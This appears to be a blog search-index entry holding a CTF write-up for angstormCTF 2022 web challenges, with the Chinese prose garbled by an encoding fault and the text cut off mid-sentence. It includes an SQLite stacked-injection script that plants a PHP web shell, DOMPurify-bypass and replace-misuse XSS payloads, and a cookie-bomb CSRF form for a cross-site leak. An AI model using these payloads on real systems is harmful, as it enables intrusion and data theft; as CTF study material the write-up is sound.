<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>angstormCTF 2022</title>
      <link href="2022/05/05/angstormCTF-2022/"/>
      <url>2022/05/05/angstormCTF-2022/</url>
      
        <content type="html"><![CDATA[<p>  ä¸Šä¸€æ¬¡å•æŒ‘æ‰“angstormCTF å·²ç»æ˜¯ä¸€å¹´å¤šä»¥å‰çš„äº‹äº†ï¼Œå½“æ—¶è®°å¾—æœ‰è´¨é‡æŒºä¸é”™çš„å‰ç«¯webé¢˜ï¼Œä¸è¿‡å¾ˆå¯æƒœæ²¡èƒ½akã€‚ è¿™æ¬¡è¶ç€æœ€è¿‘æ¯”è¾ƒé—²ï¼Œæ­£å¥½å•æŒ‘akæ‰webé¢˜ï¼ŒåŠ ä¸Šæœ‰2é“é¢˜è´¨é‡è¿˜ä¸é”™, è¿™é‡Œç®€å•è®°å½•ä¸‹</p><a id="more"></a><p><img src="https://imgbucket404.oss-cn-beijing.aliyuncs.com/img/upload_4aed0a95834bec3491065ea9e631f0d2.png" class="lazyload" data-srcset="https://imgbucket404.oss-cn-beijing.aliyuncs.com/img/upload_4aed0a95834bec3491065ea9e631f0d2.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt></p><h2 id="The-Flash"><a href="#The-Flash" class="headerlink" title="The Flash"></a>The Flash</h2><p>å‰ç«¯jsä»£ç åŠ äº†æ··æ·†ï¼Œæ˜¾ç¤ºå‡ºçš„æ–‡å­—æ˜¯å‡çš„flag, ä½†æ˜¯æ­£å¦‚é¢˜ç›®åflashä¸€æ ·ï¼ŒçœŸæ­£çš„flagä¼¼ä¹ä¼šé—´éš”æ€§çš„ä¸€é—ªè€Œè¿‡ã€‚æ‰€ä»¥ç›´æ¥å†™ä¸ªå®šæ—¶å°±å¥½ </p><pre><code class="javascript">setInterval(()=&gt; console.log(flash.textContent), 50)</code></pre><h2 id="Auth-Skip"><a href="#Auth-Skip" class="headerlink" title="Auth Skip"></a>Auth Skip</h2><p>é€šè¿‡æ— ç­¾åçš„cookieé‰´æƒï¼Œæ‰€ä»¥å¸¦ä¸Šcookieè®¿é—®</p><h2 id="crumbs"><a href="#crumbs" class="headerlink" title="crumbs"></a>crumbs</h2><p>flagåœ¨urlä¸ºæŸä¸ªuuidçš„é¡µé¢ã€‚è€Œåˆå§‹æ‰€æœ‰é¡µé¢çš„uuidå€¼ä¼šæŒ‰é“¾è¡¨ä¸€æ ·è¢«å­˜å‚¨èµ·æ¥å›æ˜¾ç»™æˆ‘ä»¬ä¸‹ä¸€ä¸ªç»“ç‚¹ã€‚<br>æ‰€ä»¥å†™ä¸ªè„šæœ¬è·Ÿéšå†…å®¹é‡Œçš„uuidä½œä¸ºurlå°±è¡Œã€‚</p><h2 id="Xtra-Salty-Sardines"><a href="#Xtra-Salty-Sardines" class="headerlink" title="Xtra Salty Sardines"></a>Xtra Salty Sardines</h2><p> <code>String.prototype.replace</code>çš„ç»å…¸è¯¯ç”¨ã€‚ç”±äº<code>replace</code>ç¬¬ä¸€ä¸ªå‚æ•°æ˜¯è¢«è®¾è®¡ä¸ºä¼ é€’æ­£åˆ™çš„ï¼Œé‚£ä¹ˆå¦‚æœåªæ˜¯ä¼ é€’å­—ç¬¦ä¸²çš„è¯å°±æ— æ³•åšåˆ°æŠŠæ•´ä¸ªå­—ç¬¦ä¸²é‡Œæ‰€æœ‰åŒ¹é…çš„å­—ç¬¦å…¨éƒ¨æ¸…æ‰ï¼Œè€Œæ˜¯åªæ¸…ç†æ‰ç¬¬ä¸€æ¬¡å‡ºç°çš„åŒ¹é…å­—ç¬¦ã€‚æ‰€ä»¥<code>&lt;&gt;&#39;&amp;aaa&lt;script&gt;alert(1)&lt;/script&gt;</code>å°±èƒ½ç›´æ¥xssäº†ã€‚</p><h2 id="Art-Gallery"><a href="#Art-Gallery" class="headerlink" title="Art Gallery"></a>Art Gallery</h2><p>ç»™äº†ä¸ªä»»æ„æ–‡ä»¶ä¸‹è½½ã€‚åŠ ä¸Šé¢˜ç›®æç¤ºè¯´<code>.git</code>ã€‚æ‰€ä»¥å¤šåŠæ˜¯ç›´æ¥æŠŠ.gitæ‹¿ä¸‹æ¥å›æ»šã€‚è¿™ä¸ªgithubä¸Šéšä¾¿æ‰¾ä¸€ä¸ªgitdumpçš„é¡¹ç›®æ”¹ä¸‹å°±å¥½äº†ã€‚æœ€åå›æ»šåˆ°åˆå§‹commitæ‹¿åˆ°flag.txt</p><h2 id="School-Unblocker"><a href="#School-Unblocker" class="headerlink" title="School Unblocker"></a>School Unblocker</h2><p>  ç®€è€Œè¨€ä¹‹å°±æ˜¯åˆ©ç”¨<code>node-fetch</code>çš„é‡å®šå‘æ¥ssrf.æ­¤å¤„æ˜¯ä¸€ä¸ª<code>POST</code> =&gt; <code>POST</code>çš„åœºæ™¯ï¼Œå‚è€ƒ<a href="https://www.leavesongs.com/PENETRATION/the-collision-of-containers-and-the-cloud-pentesting-a-MinIO.html" target="_blank" rel="noopener">pç‰›çš„æ–‡ç« </a> ç”¨307çŠ¶æ€ç å°±å¯ä»¥è§£å†³ã€‚</p><h2 id="Secure-Vault"><a href="#Secure-Vault" class="headerlink" title="Secure Vault"></a>Secure Vault</h2><p>æ¯”è¾ƒç±»ä¼¼UAFçš„åœºæ™¯ã€‚é¢˜ç›®æä¾›äº†æ³¨å†Œç™»å½•æ³¨é”€ç­‰åŠŸèƒ½ä»¥åŠä½¿ç”¨jwt tokenä½œä¸ºé‰´æƒï¼Œå³æ ¹æ®tokené‡Œçš„idå»å†…å­˜æ•°æ®åº“é‡Œæ‰¾å¯¹åº”çš„ç”¨æˆ·ã€‚ä½†æ˜¯å¦‚æœæ‰¾ä¸åˆ°çš„è¯åˆ™è¿”å›<code>{}</code>.è€Œåªè¦ç”¨<code>{}.restricted == undefined</code>å°±èƒ½æ‹¿åˆ°flag.æ‰€ä»¥æ³¨é”€è‡ªå·±çš„ç”¨æˆ·åï¼Œç”¨åˆšåˆšçš„tokenè®¿é—®ä¸‹<code>/vault</code>å°±è¡Œäº†ã€‚</p><h2 id="No-Flags"><a href="#No-Flags" class="headerlink" title="No Flags"></a>No Flags</h2><p> è¿™æ¬¡æ‰€æœ‰webé¢˜é‡Œå”¯ä¸€å¯ä»¥rceçš„é¢˜ï¼ˆåˆ’é‡ç‚¹ï¼‰ã€‚<br> sqliteæ•°æ®åº“çš„å †å æ³¨å…¥ + php =&gt; web shell</p><pre><code class="python">import requestsurl = &quot;https://no-flags.web.actf.co/&quot;PAYLOAD = &quot;&quot;&quot;flag{begins}&#39;);ATTACH DATABASE &#39;/var/www/html/abyss/test.php&#39; AS byctest;CREATE TABLE byctest.wtf (dataz text);INSERT INTO byctest.wtf (dataz) VALUES (&#39;&lt;?php system(&quot;/printflag&quot;); ?&gt;&#39;);INSERT INTO Flags VALUES (&#39;flag{success&quot;&quot;&quot;resp = requests.post(url, data={    &quot;flag&quot;: PAYLOAD})print(resp.text)resp = requests.get(f&quot;{url}/abyss/test.php&quot;)print(resp.text)</code></pre><h2 id="Cliche"><a href="#Cliche" class="headerlink" title="Cliche"></a>Cliche</h2><p>æœ¬é¢˜çš„åœºæ™¯å…¶å®å¾ˆæœ‰æ„æ€ï¼Œé¦–å…ˆçœ‹ä¸‹ä»£ç : </p><pre><code class="html"> ...&lt;title&gt;HackerMD&lt;/title&gt;    &lt;script src=&quot;https://cdn.jsdelivr.net/npm/dompurify@2.3.6/dist/purify.min.js&quot;&gt;&lt;/script&gt;    &lt;script src=&quot;https://cdn.jsdelivr.net/npm/marked@4.0.14/lib/marked.umd.min.js&quot;&gt;&lt;/script&gt; ...&lt;script&gt;        const qs = new URLSearchParams(location.search);        if (qs.get(&quot;content&quot;)?.length &gt; 0) {            document.body.innerHTML = marked.parse(DOMPurify.sanitize(qs.get(&quot;content&quot;)));        }&lt;/script&gt;</code></pre><p>ç»™äº†ä¸€ä¸ªè£¸çš„dom xss. ä¸è¿‡åŒæ—¶å­˜åœ¨Dompurifyä»¥åŠmarked, éƒ½æ˜¯æœ€æ–°ç‰ˆæœ¬ï¼Œæœ€ç»ˆå°†ç”¨æˆ·è¾“å…¥çš„æ–‡å­—è¿›è¡Œmarkdown è½¬ htmlã€‚ä½†æ˜¯å¯ä»¥æ³¨æ„åˆ°ï¼Œè¿™é‡Œ<code>marked.parse</code>ä¸<code>DomPurify.sanitize</code>çš„é¡ºåºä¼¼ä¹ä¸å¤ªå¯¹åŠ²ï¼Ÿæ­£å¸¸æ¥è®²ï¼Œ<code>DOMPurify</code>æ”¾åˆ°æœ€åä¸€æ­¥æ¥å¯¹htmlå†…å®¹è¿›è¡Œå¤„ç†æ˜¯æ¯”è¾ƒåˆç†çš„ï¼Œæ—¢ç„¶æ­¤å¤„æ˜¯å…ˆç”¨æ¥å¤„ç†ç”¨æˆ·è¾“å…¥ï¼Œå¿…ç„¶å­˜åœ¨æŸäº›ç»•è¿‡æ‰‹æ®µã€‚</p><p>é¦–å…ˆæˆ‘ä»¬æ¥è€ƒè™‘ä¸‹ï¼Œå¦‚æœå•çº¯å¯¹<code>marked</code>è¿›è¡Œæ”»å‡»ï¼Œè¦å¦‚ä½•xss?</p><p>æ¯”è¾ƒå…¸å‹çš„markdown xss çš„payloadæ„é€ å¦‚<code>[xss](javascript:alert(1))</code>è™½ç„¶å¯¹markedè€Œè¨€æ˜¯å¯è¡Œçš„ã€‚ä¸è¿‡ç”±äºéœ€è¦one clickï¼Œè‚¯å®šä¸ä¼šå‡ºç°åœ¨CTFé¢˜ç›®ä¸­ã€‚è€ƒè™‘åˆ°è¿™ç‚¹ï¼ŒåŠ ä¸Šmarkdown æœ¬èº«ä¹Ÿæ”¯æŒhtml, ç›´æ¥å¡ä¸€ä¸ªhtml codeå°±è¡Œ</p><pre><code class="javascript">marked.parse(&#39;### 213&lt;img src=x onerror=alert(1)&gt;&#39;)//&#39;&lt;h3 id=&quot;213&quot;&gt;213&lt;img src=x onerror=alert(1)&gt;&lt;/h3&gt;\n&#39;</code></pre><p>ä½†æ˜¯é—®é¢˜éšä¹‹è€Œæ¥ã€‚ å¦‚æœåƒè¿™æ ·å¡xssä»£ç çš„è¯ï¼Œå‰ä¸€æ­¥çš„<code>DOMPurify</code>å°±ä¼šå…ˆæŠŠ<code>onerror</code>å±æ€§å¤„ç†æ‰ã€‚åŠŸäºä¸€ç¯‘ã€‚</p><p>è€ƒè™‘åˆ°marked ä½œä¸ºä¸€ä¸ªstaræ•°ä¸Šä¸‡çš„å¤§é¡¹ç›®ï¼ŒåŸºæœ¬ä¸å¯èƒ½æœ‰æ–°çš„æ„é€ xssçš„æ–¹å¼ã€‚è€Œ<code>DOMPurify</code>ä»å»å¹´ä¸‹åŠå¹´å¼€å§‹ä¹ŸåŸºæœ¬å°±æ²¡æœ‰å‡ºç°æ–°çš„ç»•è¿‡ã€‚é‚£ä¹ˆæ­¤å¤„å¤§è‡´å¯ä»¥è€ƒè™‘æ’é™¤ä¾èµ–çš„ç»•è¿‡æ‰‹æ®µã€‚æ­¤æ—¶å¾ˆè‡ªç„¶å¯ä»¥è€ƒè™‘ï¼Œæœ‰æ²¡æœ‰åŠæ³•åˆ©ç”¨äºŒè€…çš„å·®å¼‚æ€§ï¼Œè®©æœ€ç»ˆè¾“å‡ºå¡è¿›ä¸€ä¸ªå¸¦<code>onerror</code>å±æ€§çš„img tagå°±å¥½äº†ã€‚</p><p>å…·ä½“åœ°è¯´ï¼Œæœ‰æ²¡æœ‰è¿™æ ·çš„æƒ…å†µï¼Œä½¿å¾—å½¢å¦‚<code>&lt;img src=x on[BLANK]error=alert(1)&gt;</code>çš„payloadé¦–å…ˆç»•è¿‡<code>DOMPurify</code>çš„æ£€æŸ¥ï¼Œå¹¶ä¸”å…¶ä¸­<code>[BKANK]</code>ä¼šè¢«markedå¤„ç†æ‰ï¼Œä»è€Œå®ç°ç»•è¿‡çš„ç›®çš„å‘¢ï¼Ÿ</p><p>åœ¨ç¿»çœ‹äº†ä¸€ä¸‹markdown çš„æ ‡å‡†åï¼Œæ³¨æ„åˆ°ï¼š</p><p><a href="https://spec.commonmark.org/0.30/#example-174" target="_blank" rel="noopener">https://spec.commonmark.org/0.30/#example-174</a></p><p><img src="https://imgbucket404.oss-cn-beijing.aliyuncs.com/img/upload_04e2754a0ad87a9c15bd3c2f4d4cb022.png" class="lazyload" data-srcset="https://imgbucket404.oss-cn-beijing.aliyuncs.com/img/upload_04e2754a0ad87a9c15bd3c2f4d4cb022.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt></p><p>å¯ä»¥çœ‹åˆ°<code>\n&gt;</code>ä½œä¸ºblockquoteçš„ç”¨æ³•ï¼Œå®ƒä¼šå»æŠŠæ‰€æœ‰ä»¥å…¶ä¸ºå¼€å¤´åç»­çš„å­—ç¬¦æ”¾åˆ°<code>&lt;blockquote&gt;</code>ä¸­åŒ…è£¹ã€‚é‚£ä¹ˆè¿™ä¸æ­£å¥½ç¬¦åˆæˆ‘ä»¬çš„éœ€æ±‚ï¼Œå³è®©<code>marked</code>å¤„ç†æ‰payloadå…¶ä¸­éƒ¨åˆ†å­—ç¬¦ä¹ˆï¼Ÿ</p><p>å‰©ä¸‹å°±åªæœ‰ä¸€ä¸ªå°é—®é¢˜äº†ã€‚<code>DOMPurify</code>å¤„ç†è¾“å…¥æ—¶ï¼Œå¾€å¾€ä¼šæŠŠæœªåŒ¹é…çš„<code>&lt;</code>,<code>&gt;</code>,<code>\n</code>ç­‰å­—ç¬¦è¿›è¡Œè½¬ä¹‰æˆ–è€…æ¸…é™¤ã€‚æ‰€ä»¥æˆ‘ä»¬è¦æŠŠè¿™äº›å­—ç¬¦å¡è¿›ä¸€ä¸ªä¸ä¼šè¢«è½¬ä¹‰çš„åœ°æ–¹ã€‚æ”¾åˆ°ä¸€ä¸ªhtml tagçš„å±æ€§é‡Œé¢å³å¯ã€‚</p><pre><code class="javascript">DOMPurify.sanitize(&#39;### 213&lt;img src=&quot;aaa&gt;\n&lt;&gt;&quot; &gt;&#39;)// &#39;### 213&lt;img src=&quot;aaa&gt;\n&lt;&gt;&quot;&gt;&#39;DOMPurify.sanitize(&#39;### 213&lt;img src=&quot;aaa&gt;\n&lt;&gt;&quot; &lt;&gt;&lt;&#39;)&#39;### 213&lt;img src=&quot;aaa&gt;\n&lt;&gt;&quot;&gt;&amp;lt;&#39;</code></pre><p>ç®€å•è¯•éªŒä¸‹ï¼š</p><pre><code class="javascript">marked.parse(&#39;### 213&lt;img src=&quot;\n&gt;&lt;THIS IS ESCAPED&gt;&quot;&#39;)//&#39;&lt;h3 id=&quot;213img-src&quot;&gt;213&amp;lt;img src=&amp;quot;&lt;/h3&gt;\n&lt;blockquote&gt;\n&lt;p&gt;&lt;THIS IS ESCAPED&gt;&amp;quot;&lt;/p&gt;\n&lt;/blockquote&gt;\n&#39;</code></pre><p>æœ€ç»ˆpayload:</p><pre><code class="javascript">marked.parse(DOMPurify.sanitize(&#39;### 123&lt;img src=&quot;a\n&gt;&lt;img src=x onerror=alert(1)&gt;\n&gt;&quot;&gt;&#39;))//&#39;&lt;h3 id=&quot;123img-srca&quot;&gt;123&amp;lt;img src=&amp;quot;a&lt;/h3&gt;\n&lt;blockquote&gt;\n&lt;img src=x onerror=alert(1)&gt;\n&quot;&gt;&lt;/blockquote&gt;\n&#39;</code></pre><p>å½“ç„¶è¿™é¢˜è¿˜æœ‰å¾ˆå¤šå…¶ä»–åšæ³•ï¼Œæ„Ÿå…´è¶£çš„å¯ä»¥ç»§ç»­æ¢ç´¢ä¸‹ :)</p><h2 id="Sustenance"><a href="#Sustenance" class="headerlink" title="Sustenance"></a>Sustenance</h2><p>æœ¬é¢˜çš„æ ¸å¿ƒä»£ç å…¶å®å¾ˆç®€å•ï¼Œä½†æ˜¯åšèµ·æ¥èŠ±äº†å¥½ä¹…ã€‚ã€‚ã€‚</p><pre><code class="javascript">const adminSecret = process.env.ADMIN_SECRET || &quot;secretpw&quot;;const flag =    process.env.FLAG ||    &quot;actf{someone_is_going_to_submit_this_out_of_desperation}&quot;;function queryMiddleware(req, res, next) {    res.locals.search =        req.cookies.search || &quot;the quick brown fox jumps over the lazy dog&quot;;    // admin is a cool kid    if (req.cookies.admin === adminSecret) {        res.locals.search = flag;    }    next();}app.use(cookieParser());app.get(&quot;/&quot;, (req, res) =&gt; {    res.sendFile(path.join(__dirname, &quot;index.html&quot;));});app.post(&quot;/s&quot;, (req, res) =&gt; {    if (req.body.search) {        for (const [name, val] of Object.entries(req.body)) {            res.cookie(name, val, { httpOnly: true });        }    }    res.redirect(&quot;/&quot;);});app.get(&quot;/q&quot;, queryMiddleware, (req, res) =&gt; {    const query = req.query.q || &quot;h&quot;; // h    let status;    if (res.locals.search.includes(query)) {        status =            &quot;succeeded, but please give me sustenance if you want to be able to see your search results because I desperately require sustenance&quot;;    } else {        status = &quot;failed&quot;;    }    res.redirect(        &quot;/?m=&quot; +            encodeURIComponent(                `your search that took place at ${Date.now()} has ${status}`            )    );});</code></pre><p>å¯ä»¥çœ‹åˆ°åŸºæœ¬å°±æ˜¯ä¸€ä¸ªxsleakçš„åœºæ™¯ã€‚ä½†æ˜¯æ¡ä»¶å¯ä»¥è¯´ç›¸å½“è‹›åˆ»ã€‚å‡å¦‚åªè€ƒè™‘<code>/q</code>è·¯ç”±çš„searchåŠŸèƒ½ï¼Œæœ€ç»ˆæœç´¢åˆ°ä¸æœªæœç´¢åˆ°åªæœ‰urlé•¿åº¦çš„åŒºåˆ«ã€‚æœ€ç»ˆåæ˜ åˆ°å‰ç«¯ä¸ŠåŠ è½½çš„èµ„æºä¹Ÿæ²¡æœ‰å˜åŒ–ï¼Œç”¨<del>ç¼“å­˜æˆ–è€…ç”¨</del><code>performance</code>æ¥æ¢æµ‹éƒ½ä¸å¤ªå¯è¡Œçš„æ ·å­ã€‚</p><p>ä½†æ˜¯æ³¨æ„åˆ°æ­¤å¤„è¿˜å‰©ä¸‹ä¸€ä¸ª<code>/s</code>è·¯ç”±, å¯ä»¥åšåˆ°é€šè¿‡req.bodyä»»æ„è®¾ç½®cookie çš„nameä¸value.é‚£ä¹ˆæœ‰ä»€ä¹ˆç”¨å‘¢ï¼Ÿè¿™é‡Œä¸€å¼€å§‹çš„æƒ³æ³•æ˜¯ï¼Œåˆ©ç”¨ä»»æ„è®¾ç½®cookieçš„name,valueçš„åœºæ™¯ä¸æˆ‘æ›¾ç»è§è¿‡çš„ä¸€ä¸ªåœºæ™¯ç±»ä¼¼ã€‚æ›¾ç»goçš„1.15ç‰ˆæœ¬å·¦å³,ç”¨äºè®¾ç½®headerçš„å‡½æ•°æ²¡æœ‰è¿‡æ»¤<code>&lt;name-value&gt;</code>é”®å€¼å¯¹ä¸­çš„name,å¯¼è‡´å‰è€…å¯æ§çš„æƒ…å†µä¸‹å¯ä»¥å¡å…¥<code>\r\n</code>é€ æˆCRLF.ä¸è¿‡æ­¤å¤„çœ‹äº†ä¸‹expressçš„å®ç°ï¼Œæ˜¯å€Ÿç”¨æ­£åˆ™æ£€æŸ¥äº†<code>name</code>å¹¶æŠŠ<code>value</code>ç”¨<code>encodeURICompenent()</code>å¤„ç†äº†ã€‚æ‰€ä»¥è‚¯å®šæ²¡æ³•CRLF.</p><p>é‚£ä¹ˆè®¾ç½®cookieæœ‰ä»€ä¹ˆç”¨å‘¢ï¼Ÿæˆ‘åˆä»”ç»†çœ‹äº†ä¸‹expressçš„ä»£ç ï¼Œå‘ç°å€’æ˜¯å¯ä»¥é€šè¿‡name: <code>ABC=test; SameSite=None; Secure; Path=/; A</code>, value: <code>1</code>çš„æ‰‹æ®µï¼ŒæŠŠæ‰€è®¾ç½®çš„cookieçš„samesiteå±æ€§æ”¹åŠ¨ä¸‹ã€‚åŠ ä¸Šæˆ‘ä»¬xsleak å¿…å®šæ˜¯cross-originçš„ï¼Œè¯´æ˜è¿™ä¸ªæ‰‹æ®µè‚¯å®šæ˜¯æœ‰ç”¨çš„ï¼Œä¹Ÿå°±æ˜¯è·¨åŸŸäº†ä¹Ÿèƒ½é€šè¿‡é<code>top-level navigation</code>å¸¦ä¸Šè‡ªå®šä¹‰çš„cookieè¯·æ±‚.</p><p>å¦‚æœcookieæ˜¯è¿™ä¸ªç”¨å¤„çš„è¯ï¼Œè€ƒè™‘åˆ°æˆ‘ä»¬ç°åœ¨éœ€è¦ä¸€ç§æ–¹æ³•æ¥è·¨åŸŸåœ°åˆ†è¾¨æœç´¢çš„ç»“æœï¼Œé‚£ä¹ˆåªèƒ½è€ƒè™‘é€šè¿‡<code>Error event</code>æ¥æ¢æµ‹äº†ã€‚<br>è¿™ä¸ªåœ¨xsleaks wiki ä¹Ÿæœ‰æ”¶å½•  <a href="https://xsleaks.dev/docs/attacks/error-events/" target="_blank" rel="noopener">https://xsleaks.dev/docs/attacks/error-events/</a></p><p>æ¢å¥è¯è¯´ç°åœ¨æˆ‘ä»¬è¦ç”¨cookieæ¥è§¦å‘é”™è¯¯äº‹ä»¶ã€‚ç”±äº<code>/q</code>å¤„æœç´¢ç»“æœæ ¹æ®æ­£ç¡®ä¸å¦ï¼Œurlé•¿åº¦æ˜¯ä¸åŒçš„ï¼Œé‚£ä¹ˆæˆ‘ä»¬æ˜¯å¦å¯ä»¥åˆ©ç”¨cookieæ¥å¢åŠ è¯·æ±‚çš„é•¿åº¦ï¼Œä½¿å…¶æ¥è¿‘é˜ˆå€¼ã€‚å¦‚æœæœåˆ°äº†åŒ¹é…å­—ç¬¦ï¼Œå…¶æ›´é•¿çš„urlåŠ ä¸Šcookieçš„è¯·æ±‚ä¼šä½¿å¾—é¡µé¢æŠ¥é”™ï¼Œè€Œæœªæœåˆ°ç»“æœçš„url+cookie ä¸ä¼šå¯¼è‡´æŠ¥é”™å‘¢ï¼Ÿ</p><p>ç»è¿‡ç®€å•çš„å®éªŒæˆ‘å‘ç°è¿™æ˜¯å¯è¡Œçš„ï¼Œå‡å¦‚cookieå¤Ÿå¤šï¼Œé…ä¸Šä¸€å®šé•¿åº¦çš„urlï¼Œä¼šä½¿å½“å‰ç«™è§¦å‘ä¸€ä¸ª413 çš„çŠ¶æ€ç ã€‚è¿™å®é™…ä¸Šå°±æ˜¯æ—©å¹´å°±å·²å‡ºç°çš„ä¸€ç§åä¸ºcookie bombçš„DOSæ”»å‡»æ‰‹æ³•ã€‚è¿™æ ·æˆ‘ä»¬å°±æœ‰äº†xsleakçš„æ‰‹æ®µäº†ï¼</p><p>è¿™é‡Œé¦–å…ˆå†™ä¸€ä¸ªåŠ cookieçš„è¡¨å•</p><pre><code class="html">&lt;!-- csrf.html --&gt;&lt;form action=&quot;https://sustenance.web.actf.co/s&quot; method=&quot;POST&quot; id=&quot;form&quot;&gt;    &lt;input name=&#39;search&#39; value=&#39;test&#39;&gt;    &lt;input id=&quot;A&quot; name=&#39;&#39; value=&#39;1&#39;&gt;&lt;/form&gt;&lt;script&gt;let num = location.search;num = num.substring(1);if (num!=&quot;5&quot;) {    document.getElementById(&quot;A&quot;).name = `${num}=${&quot;A&quot;.repeat(3765)}; SameSite=None; Secure; Path=/; A`;} else {    document.getElementById(&quot;A&quot;).name = `${num}=${&quot;A&quot;.repeat(475)};SameSite=None; Secure; Path=/; A`;}form.submit();&lt;/script&gt;</code></pre><p>ç”±äºæ¯æ¬¡æäº¤çš„bodyé•¿åº¦æœ‰é™ï¼Œæˆ‘è¯•äº†ä¸‹å¤§æ¦‚æäº¤5æ¬¡å°±å¯ä»¥è®©cookieé•¿åº¦æ¥è¿‘ä¸€ä¸ªé˜ˆå€¼äº†ï¼Œå…¶ä¸­æœ€åä¸€ä¸ªcookieå€¼å¯ä»¥ç¨å¾®å°‘ä¸€ç‚¹ã€‚</p><p>ç„¶è€Œæ­¤æ—¶æˆ‘æ„è¯†åˆ°ä¸€ä¸ªé—®é¢˜ï¼Œæˆ‘ä»¬çœ‹ä¸‹é¢˜ç›®è·å–flagçš„ä»£ç </p><pre><code class="javascript">    if (req.cookies.admin === adminSecret) {        res.locals.search = flag;    }</code></pre><p>ä¹Ÿå°±æ˜¯è¯´ï¼Œå¿…é¡»è¦æœ‰adminçš„cookieæ‰èƒ½ä¿è¯æœçš„ç»“æœæ˜¯åœ¨ä¸flagç›¸åŒ¹é…ã€‚ä½†æ˜¯å‡å¦‚æˆ‘ä»¬å‡è®¾admin-botçš„cookieé…ç½®å°±æ˜¯æœ€æœ´ç´ çš„<code>admin=xxxxxx</code>çš„è¯ï¼Œå…¶<code>SameSite</code>å±æ€§é»˜è®¤æ˜¯ä¸º<code>Lax</code>çš„ã€‚è€Œ<code>Lax</code>ä¿®é¥°çš„cookieåªæœ‰åœ¨å‘ç”Ÿ<code>top-level navigation</code>çš„æƒ…å†µä¸‹æ‰ä¼šè·¨åŸŸä¼ é€’ã€‚ç®€å•è¯´å°±æ˜¯åªæœ‰å½“æµè§ˆå™¨urlè¾“å…¥æ çš„å€¼å‘ç”Ÿå˜åŒ–æ‰ä¼šè·¨åŸŸä¼ é€’å®ƒï¼ŒåŒ…æ‹¬ä½†ä¸é™äº<code>window.open</code>æ‰“å¼€é¡µé¢ä»¥åŠform è¡¨å•æäº¤ç­‰æƒ…å†µã€‚</p><p>å‡å¦‚æˆ‘ä»¬æ˜¯ä½¿ç”¨ xsleak å¸¸è§„çš„æ¢æµ‹errorçš„æ–¹æ³•çš„è¯ï¼Œè™½ç„¶botä¼šå¸¦ä¸Šæˆ‘ä»¬å…ˆå‰è®¾ç½®çš„cookie,ä½†æ˜¯å´æ²¡åŠæ³•å¸¦ä¸Šè‡ªå·±çš„admin cookieã€‚å¯¼è‡´åŒ¹é…çš„å†…å®¹ä¸æ˜¯flagâ€¦â€¦.</p><pre><code class="javascript">function probeError(url) {  let script = document.createElement(&#39;script&#39;);  script.src = url;  script.onload = () =&gt; console.log(&#39;Onload event triggered&#39;);  script.onerror = () =&gt; console.log(&#39;Error event triggered&#39;);  document.head.appendChild(script);}// because google.com/404 returns HTTP 404, the script triggers error eventprobeError(&#39;https://sustenance.web.actf.co/q?q=actf&#39;);</code></pre><p>åˆ°è¿™ä¸€æ­¥æˆ‘å¡äº†å¿«ä¸€å¤©å·¦å³ï¼Œå› ä¸ºæŒ‰ç…§ä¸Šé¢çš„æ€è·¯ï¼Œåªæœ‰<code>window.open(&#39;https://sustenance.web.actf.co/q?q=actf&#39;)</code>çš„æƒ…å†µæ‰èƒ½ä¿è¯æœçš„æ˜¯flag.å¦åˆ™è‚¯å®šä¸å¯è¡Œã€‚ç„¶è€Œæœäº†å¾ˆä¹…ä¹Ÿæ²¡æ³•æ‰¾åˆ°ç”¨windowæ¥è·¨åŸŸæ¢æµ‹çŠ¶æ€çš„æƒ…å†µã€‚æ­¤æ—¶ä¾¿é™·å…¥åƒµå±€äº†ã€‚</p><p>æ­¤æ—¶æˆ‘å¼€å§‹è€ƒè™‘adminçš„cookieä¼šä¸ä¼šè¢«è®¾ç½®ä¸ºsamesite ä¸ºnoneçš„æƒ…å†µäº†ã€‚ä½†æ˜¯è¿™ç§ç‰¹æ®Šæƒ…å†µåŸºæœ¬ä¸å¤ªå¯èƒ½ã€‚å¦‚æœçœŸçš„æ˜¯samesite ä¸ºLaxçš„é»˜è®¤æƒ…å†µï¼Œæƒ³è¦cookieèƒ½å¤Ÿåœ¨<code>probeError</code>æ—¶è¢«ä¼ é€’ï¼Œæˆ‘å¿…é¡»éƒ¨ç½²è‡ªå·±çš„htmlåˆ°è¿™ä¸ªç«™æˆ–è€…æ—ç«™ä¸Šå»ã€‚ã€‚ã€‚ã€‚ã€‚ã€‚</p><p>ç­‰ä¸‹ï¼Œæ­¤æ—¶æˆ‘çªç„¶æƒ³èµ·ä¹‹å‰æ‰€åšçš„é¢˜ç›®<code>No flags</code>æ˜¯å·²ç»rceçš„ï¼Œè€Œé‚£ä¸€é“é¢˜ç›®å¯ä»¥ä¼ webshellï¼Œå³å¯ä»¥éƒ¨ç½²æ–‡ä»¶ä¸Šå»ã€‚è€Œæœ¬é¢˜å’Œè¯¥é¢˜çš„urlåˆ†åˆ«æ˜¯ï¼š<code>https://sustenance.web.actf.co/</code>, <code>https://no-flags.web.actf.co/</code>ã€‚</p><p>æˆ‘ä»¬çŸ¥é“ï¼Œsamesiteæ˜¯æ¯”<code>same-origin</code>æ›´å¼±ä¸€ç‚¹çš„æ¦‚å¿µã€‚ä¸”samesite ä¸å¦çœ‹çš„æ˜¯<code>registrable Domain</code>çš„æ¦‚å¿µã€‚æ­¤å¤„å¯ä»¥å‚è€ƒ <a href="https://blog.huli.tw/2022/01/16/same-site-to-same-origin-document-domain/#%E7%B4%B0%E7%A9%B6-same-siteã€‚" target="_blank" rel="noopener">https://blog.huli.tw/2022/01/16/same-site-to-same-origin-document-domain/#%E7%B4%B0%E7%A9%B6-same-siteã€‚</a>  ç®€è€Œè¨€ä¹‹ï¼Œé™¤éæ˜¯<code>github.io</code>è¿™ç§è¢«<code>public suffix 